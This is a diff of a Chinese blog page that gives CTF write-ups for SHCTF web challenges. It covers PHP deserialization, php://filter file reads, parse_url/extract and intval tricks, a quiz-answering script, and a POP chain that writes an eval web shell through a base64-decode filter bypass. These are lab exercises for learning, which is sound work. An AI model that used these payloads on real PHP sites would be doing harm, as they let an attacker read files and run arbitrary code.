+highlight_file(__FILE__);
+class flag&#123;
+  public $username;
+  public $code;
+  public function __wakeup()&#123;
+    $this-&gt;username &#x3D; &quot;guest&quot;;
+  &#125;
+  public function __destruct()&#123;
+    if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;
+      include($this-&gt;code);
+    &#125;
+  &#125;
+&#125;
+unserialize($_GET[&#39;try&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>编写其反序列化代码</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">highlight_file</span>(*<span class="keyword">__FILE__</span>*);
-<span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>{
-    <span class="keyword">public</span> <span class="variable">$username</span>;
-    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{
-        <span class="variable language_">$this</span>->username = <span class="string">"guest"</span>;
-    }
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{
-        <span class="keyword">if</span>(<span class="variable language_">$this</span>->username = <span class="string">"admin"</span>){
-            <span class="keyword">include</span>(<span class="variable language_">$this</span>->code);
-        }
-    }
-}
-<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();
-<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(*__FILE__*);
+class flag&#123;
+    public $username;
+    public $code &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;
+    public function __wakeup()&#123;
+        $this-&gt;username &#x3D; &quot;guest&quot;;
+    &#125;
+    public function __destruct()&#123;
+        if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;
+            include($this-&gt;code);
+        &#125;
+    &#125;
+&#125;
+$a &#x3D; new flag();
+echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>运行结果为</p>
 <blockquote>
@@ -650,63 +645,63 @@ r=requests.post(url,data=data)
 </blockquote>
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021635121.png"></p>
 <h3 id="MD5的事就拜托了"><a href="#MD5的事就拜托了" class="headerlink" title="MD5的事就拜托了"></a>MD5的事就拜托了</h3><p>题目源码</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-<span class="keyword">include</span>(<span class="string">"flag.php"</span>);
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>])){
-  <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));
-  <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>){
-    <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));
-    <span class="keyword">echo</span>(<span class="string">"</br>"</span>);
-  }
-  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>])){
-    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];
-    <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>)){
-      <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));
-      <span class="keyword">echo</span>(<span class="string">"</br>"</span>);
-    }
-  }
-}
-<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>)){
-  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>))){
-    <span class="keyword">echo</span>(<span class="string">"flag is"</span>.<span class="variable">$flag</span>);
-  }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+include(&quot;flag.php&quot;);
+if(isset($_POST[&#39;SHCTF&#39;]))&#123;
+  extract(parse_url($_POST[&#39;SHCTF&#39;]));
+  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;
+    echo(md5($flag));
+    echo(&quot;&lt;&#x2F;br&gt;&quot;);
+  &#125;
+  if(isset($_GET[&#39;length&#39;]))&#123;
+    $num&#x3D;$_GET[&#39;length&#39;];
+    if($num*100!&#x3D;intval($num*100))&#123;
+      echo(strlen($flag));
+      echo(&quot;&lt;&#x2F;br&gt;&quot;);
+    &#125;
+  &#125;
+&#125;
+if($_POST[&#39;SHCTF&#39;]!&#x3D;md5($flag))&#123;
+  if($_POST[&#39;SHCTF&#39;]&#x3D;&#x3D;&#x3D;md5($flag.urldecode($num)))&#123;
+    echo(&quot;flag is&quot;.$flag);
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>通过后续从大佬WP上学习知道该题为MD5补充攻击，需要我们取得知flag的长度和MD5值</p>
-<h4 id="第一步、获得flag的MD5值"><a href="#第一步、获得flag的MD5值" class="headerlink" title="第一步、获得flag的MD5值"></a>第一步、获得flag的MD5值</h4><pre class="line-numbers language-highlight php"><code class="language-highlight php">参考源码
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>])){
-  <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));
-  <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>){
-    <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));
-    <span class="keyword">echo</span>(<span class="string">"</br>"</span>);
-  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="第一步、获得flag的MD5值"><a href="#第一步、获得flag的MD5值" class="headerlink" title="第一步、获得flag的MD5值"></a>第一步、获得flag的MD5值</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码
+if(isset($_POST[&#39;SHCTF&#39;]))&#123;
+  extract(parse_url($_POST[&#39;SHCTF&#39;]));
+  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;
+    echo(md5($flag));
+    echo(&quot;&lt;&#x2F;br&gt;&quot;);
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里面有几个不认识的函数，例如：**parse_url()**，其效果为</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;
-<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));
-<span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);
-<span class="meta">?></span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$url &#x3D; &#39;http:&#x2F;&#x2F;username:password@hostname&#x2F;path?arg&#x3D;value#anchor&#39;;
+print_r(parse_url($url));
+echo parse_url($url, PHP_URL_PATH);
+?&gt;
 结果----------
-<span class="title function_ invoke__">Array</span>
+Array
 (
-    [scheme] => http
-    [host] => hostname
-    [user] => username
-    [pass] => password
-    [path] => /path
-    [query] => arg=value
-    [fragment] => anchor
+    [scheme] &#x3D;&gt; http
+    [host] &#x3D;&gt; hostname
+    [user] &#x3D;&gt; username
+    [pass] &#x3D;&gt; password
+    [path] &#x3D;&gt; &#x2F;path
+    [query] &#x3D;&gt; arg&#x3D;value
+    [fragment] &#x3D;&gt; anchor
 )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>extract()函数</strong></p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="variable">$a</span> = <span class="string">"Original"</span>;
-<span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">"a"</span> => <span class="string">"Cat"</span>,<span class="string">"b"</span> => <span class="string">"Dog"</span>, <span class="string">"c"</span> => <span class="string">"Horse"</span>);
-<span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);
-<span class="keyword">echo</span> <span class="string">"\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>"</span>;
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$a &#x3D; &quot;Original&quot;;
+$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);
+extract($my_array);
+echo &quot;\$a &#x3D; $a; \$b &#x3D; $b; \$c &#x3D; $c&quot;;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p><strong>extract() 函数从数组中将变量导入到当前的符号表。</strong></p>
@@ -715,28 +710,28 @@ r=requests.post(url,data=data)
 </blockquote>
 <p><strong>如果要满足<code>$$$scheme===&#39;SHCTF&#39;</code>，我们可以使<code>[scheme] =&gt; host</code>，导致<code>$$host===&#39;SHCTF&#39;</code>；再使得<code>[host] =&gt; user</code>导致<code>$user===&#39;SHCTF&#39;</code>，就满足条件。</strong></p>
 <p>可以构造如下的数组</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">Array
+<pre class="line-numbers language-none"><code class="language-none">Array
 (
-    [scheme] => host
-    [host] => user
-    [user] => SHCTF
-    [pass] => password
-    [path] => /path
-    [query] => arg=value
-    [fragment] => anchor
+    [scheme] &#x3D;&gt; host
+    [host] &#x3D;&gt; user
+    [user] &#x3D;&gt; SHCTF
+    [pass] &#x3D;&gt; password
+    [path] &#x3D;&gt; &#x2F;path
+    [query] &#x3D;&gt; arg&#x3D;value
+    [fragment] &#x3D;&gt; anchor
 )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>构造payload：host:&#x2F;&#x2F;SHCTF:password@user&#x2F;path?arg&#x3D;value#anchor</strong></p>
 <p>得到的flag的MD5值为： <strong>5eff41d1008c731b14eec5d18c32d942</strong></p>
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021655560.png"></p>
-<h4 id="第二步、获取flag的长度"><a href="#第二步、获取flag的长度" class="headerlink" title="第二步、获取flag的长度"></a><strong>第二步、获取flag的长度</strong></h4><pre class="line-numbers language-highlight php"><code class="language-highlight php">参考源码
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>])){
-    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];
-    <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>)){
-      <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));
-      <span class="keyword">echo</span>(<span class="string">"</br>"</span>);
-    }
-  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="第二步、获取flag的长度"><a href="#第二步、获取flag的长度" class="headerlink" title="第二步、获取flag的长度"></a><strong>第二步、获取flag的长度</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码
+if(isset($_GET[&#39;length&#39;]))&#123;
+    $num&#x3D;$_GET[&#39;length&#39;];
+    if($num*100!&#x3D;intval($num*100))&#123;
+      echo(strlen($flag));
+      echo(&quot;&lt;&#x2F;br&gt;&quot;);
+    &#125;
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可以参考这位大佬的博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">PHP intval()函数详解，intval()函数漏洞原理及绕过思路_intval绕过-CSDN博客</a></p>
 <p>在<strong>intval函数</strong>中其会对所得的值进行取整，所以我们可以使**$num&#x3D;1.111**即可得到flag的长度</p>
@@ -754,97 +749,97 @@ r=requests.post(url,data=data)
 <h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="快问快答"><a href="#快问快答" class="headerlink" title="快问快答"></a>快问快答</h3><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021756005.png"></p>
 <p>根据这题提示以及尝试，要求我们2s内回答问题并连续答对50道，可想而知我们需要另辟蹊径了，即我们可以编写一个python代码来完成50道答题</p>
 <p>代码如下</p>
-<pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> requests
-<span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup
-<span class="keyword">import</span> re
-<span class="keyword">import</span> time
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
+from bs4 import BeautifulSoup
+import re
+import time
 
-<span class="comment"># 创建会话</span>
-s = requests.Session()
-url = <span class="string">&#x27;http://112.6.51.212:31530/&#x27;</span> <span class="comment">#url</span>
+# 创建会话
+s &#x3D; requests.Session()
+url &#x3D; &#39;http:&#x2F;&#x2F;112.6.51.212:31530&#x2F;&#39; #url
 
-<span class="comment"># 循环答题</span>
-correct_answers = <span class="number">0</span>
-<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">70</span>):  <span class="comment"># 除法运算时有些报错，影响了循环，这里改70</span>
-    <span class="comment"># 获取题目</span>
-    r = s.get(url)
-    r.encoding = <span class="string">&#x27;utf-8&#x27;</span>
-    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)
-    question_text = soup.find(<span class="string">"h3"</span>).text
-    <span class="built_in">print</span>(question_text)
+# 循环答题
+correct_answers &#x3D; 0
+for i in range(70):  # 除法运算时有些报错，影响了循环，这里改70
+    # 获取题目
+    r &#x3D; s.get(url)
+    r.encoding &#x3D; &#39;utf-8&#39;
+    soup &#x3D; BeautifulSoup(r.text, &quot;html.parser&quot;)
+    question_text &#x3D; soup.find(&quot;h3&quot;).text
+    print(question_text)
 
-    <span class="comment"># 使用正则表达式从题目中提取数字和运算符</span>
-    matches = re.<span class="keyword">match</span>(<span class="string">r&#x27;题目：(\d+) (异或|与|[+\-x÷]) (\d+) =&#x27;</span>, question_text)
-    <span class="comment"># 等待一秒</span>
-    time.sleep(<span class="number">1</span>)
-    <span class="keyword">if</span> matches:
-        num1 = <span class="built_in">int</span>(matches.group(<span class="number">1</span>))
-        operator = matches.group(<span class="number">2</span>)
-        num2 = <span class="built_in">int</span>(matches.group(<span class="number">3</span>))
+    # 使用正则表达式从题目中提取数字和运算符
+    matches &#x3D; re.match(r&#39;题目：(\d+) (异或|与|[+\-x÷]) (\d+) &#x3D;&#39;, question_text)
+    # 等待一秒
+    time.sleep(1)
+    if matches:
+        num1 &#x3D; int(matches.group(1))
+        operator &#x3D; matches.group(2)
+        num2 &#x3D; int(matches.group(3))
 
-        <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:
-            answer = num1 + num2
-        <span class="keyword">elif</span> operator == <span class="string">&#x27;-&#x27;</span>:
-            answer = num1 - num2
-        <span class="keyword">elif</span> operator == <span class="string">&#x27;x&#x27;</span>:
-            answer = num1 * num2
-        <span class="keyword">elif</span> operator == <span class="string">&#x27;÷&#x27;</span>:
-            answer = num1 / num2
-        <span class="keyword">elif</span> operator == <span class="string">&#x27;异或&#x27;</span>:
-            answer = num1 ^ num2
-        <span class="keyword">elif</span> operator == <span class="string">&#x27;与&#x27;</span>:
-            answer = num1 & num2
+        if operator &#x3D;&#x3D; &#39;+&#39;:
+            answer &#x3D; num1 + num2
+        elif operator &#x3D;&#x3D; &#39;-&#39;:
+            answer &#x3D; num1 - num2
+        elif operator &#x3D;&#x3D; &#39;x&#39;:
+            answer &#x3D; num1 * num2
+        elif operator &#x3D;&#x3D; &#39;÷&#39;:
+            answer &#x3D; num1 &#x2F; num2
+        elif operator &#x3D;&#x3D; &#39;异或&#39;:
+            answer &#x3D; num1 ^ num2
+        elif operator &#x3D;&#x3D; &#39;与&#39;:
+            answer &#x3D; num1 &amp; num2
 
-        <span class="comment"># 准备POST数据</span>
-        data = {<span class="string">"answer"</span>: answer}
+        # 准备POST数据
+        data &#x3D; &#123;&quot;answer&quot;: answer&#125;
 
-        <span class="comment"># 发送答案</span>
-        response = s.post(url, data=data)
-        <span class="built_in">print</span>(<span class="string">f"答案：<span class="subst">{answer}</span>"</span>)
-        <span class="built_in">print</span>(response.text)  <span class="comment"># 输出对应的response.text</span>
+        # 发送答案
+        response &#x3D; s.post(url, data&#x3D;data)
+        print(f&quot;答案：&#123;answer&#125;&quot;)
+        print(response.text)  # 输出对应的response.text
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021806467.png"></p>
 <h3 id="sseerriiaalliizzee"><a href="#sseerriiaalliizzee" class="headerlink" title="sseerriiaalliizzee"></a>sseerriiaalliizzee</h3><p>本题从题目看就是一道POC链 题目</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-<span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>{
-    <span class="keyword">public</span> <span class="variable">$barking</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{
-        <span class="variable language_">$this</span>->barking = <span class="keyword">new</span> <span class="title class_">Flag</span>;
-    }
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{
-            <span class="keyword">return</span> <span class="variable language_">$this</span>->barking-><span class="title function_ invoke__">dosomething</span>();
-    }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>{ 
-    <span class="keyword">public</span> <span class="variable">$part1</span>;
-    <span class="keyword">public</span> <span class="variable">$part2</span>;
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$part1</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$part2</span>=<span class="string">&#x27;&#x27;</span></span>) </span>{
-        <span class="variable language_">$this</span> -> part1 = <span class="variable">$part1</span>;
-        <span class="variable language_">$this</span> -> part2 = <span class="variable">$part2</span>;        
-    }
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params"></span>)</span>{
-        <span class="variable">$useless</span>   = <span class="string">&#x27;<?php die("+Genshin Impact Start!+");?>&#x27;</span>;
-        <span class="variable">$useful</span>= <span class="variable">$useless</span>. <span class="variable language_">$this</span>->part2;
-        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-> part1,<span class="variable">$useful</span>);
-    }
-}
-<span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>{
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params"></span>)</span>{
-        <span class="keyword">include</span>(<span class="string">&#x27;./flag,php&#x27;</span>);
-        <span class="keyword">return</span> <span class="string">"barking for fun!"</span>;
-    }
-}
-    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]; 
-    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>)){
-       <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$code</span>);
-    }
-    <span class="keyword">else</span>{
-        <span class="keyword">echo</span> <span class="string">"no way, fuck off"</span>;
-    }
-<span class="meta">?></span> 
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+class Start&#123;
+    public $barking;
+    public function __construct()&#123;
+        $this-&gt;barking &#x3D; new Flag;
+    &#125;
+    public function __toString()&#123;
+            return $this-&gt;barking-&gt;dosomething();
+    &#125;
+&#125;
+class CTF&#123; 
+    public $part1;
+    public $part2;
+    public function __construct($part1&#x3D;&#39;&#39;,$part2&#x3D;&#39;&#39;) &#123;
+        $this -&gt; part1 &#x3D; $part1;
+        $this -&gt; part2 &#x3D; $part2;        
+    &#125;
+    public function dosomething()&#123;
+        $useless   &#x3D; &#39;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#39;;
+        $useful&#x3D; $useless. $this-&gt;part2;
+        file_put_contents($this-&gt; part1,$useful);
+    &#125;
+&#125;
+class Flag&#123;
+    public function dosomething()&#123;
+        include(&#39;.&#x2F;flag,php&#39;);
+        return &quot;barking for fun!&quot;;
+    &#125;
+&#125;
+    $code&#x3D;$_POST[&#39;code&#39;]; 
+    if(isset($code))&#123;
+       echo unserialize($code);
+    &#125;
+    else&#123;
+        echo &quot;no way, fuck off&quot;;
+    &#125;
+?&gt; 
 no way, fuck off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>本题可以构造的POC链为</strong></p>
@@ -852,19 +847,19 @@ no way, fuck off<span aria-hidden="true" class="line-numbers-rows"><span></span>
 <p>这其中我们需要考虑的是如何绕过CTF类中的$useless里面的die方法，如果使其执行，那么代码直接结束，我们想要写入的代码也无法写入，通过上网搜索，可以通过base编码来绕过</p>
 <blockquote>
 <p>原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">$filename=&#x27;php://filter/convert.base64-decode/resource=s1mple.php&#x27;;
-$content = &#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">$filename&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;s1mple.php&#39;;
+$content &#x3D; &#39;aPD9waHAgcGhwaW5mbygpOz8+&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；载荷效果如下：</p>
 </blockquote>
 <p>具体详情可以看这位大佬博客<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)</a></p>
 <p>所以我们可以如此构造POC链</p>
-<pre class="line-numbers language-highlight php"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_"><code class="language-highlight php"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();
-<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();
-<span class="variable">$a</span> -> barking = <span class="variable">$b</span>;
-<span class="variable">$b</span> -> part1 = <span class="string">"php://filter/convert.base64-decode/resource=1.php"</span>;
-<span class="variable">$b</span> -> part2 =  <span class="string">&#x27;aa&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;<?php eval($_POST[1]); ?>&#x27;</span>);
-<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">$a &#x3D; new Start();
+$b &#x3D; new CTF();
+$a -&gt; barking &#x3D; $b;
+$b -&gt; part1 &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.php&quot;;
+$b -&gt; part2 &#x3D;  &#39;aa&#39;.base64_encode(&#39;&lt;?php eval($_POST[1]); ?&gt;&#39;);
+echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将序列化后的值传参进去</p>
 <p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021932320.png"></p>
@@ -1018,13 +1013,13 @@ $content = &#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;;<span aria-hidden="true" class=
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/11/30/2023ISCTF%E9%83%A8%E5%88%86WP/">
+                <a href="/2023/11/11/2023NewStarCTF-Week3-%E9%83%A8%E5%88%86WP/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="2023ISCTF部分WP">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="2023NewStarCTF-Week3-部分WP">
                         
-                        <span class="card-title">2023ISCTF部分WP</span>
+                        <span class="card-title">2023NewStarCTF-Week3-部分WP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1035,7 +1030,7 @@ $content = &#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;;<span aria-hidden="true" class=
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-11-30
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-11-11
                         </span>
                         <span class="publish-author">
                             
@@ -1048,8 +1043,8 @@ $content = &#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;;<span aria-hidden="true" class=
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%96%B0%E6%89%8B%EF%BC%8CWEB%EF%BC%8CMISC/">
-                        <span class="chip bg-color">新手，WEB，MISC</span>
+                    <a href="/tags/CTF%EF%BC%8C%E5%AD%A6%E4%B9%A0%EF%BC%8C%E6%96%B0%E6%89%8B/">
+                        <span class="chip bg-color">CTF，学习，新手</span>
                     </a>
                     
                 </div>
@@ -1112,9 +1107,6 @@ $content = &#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;;<span aria-hidden="true" class=
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
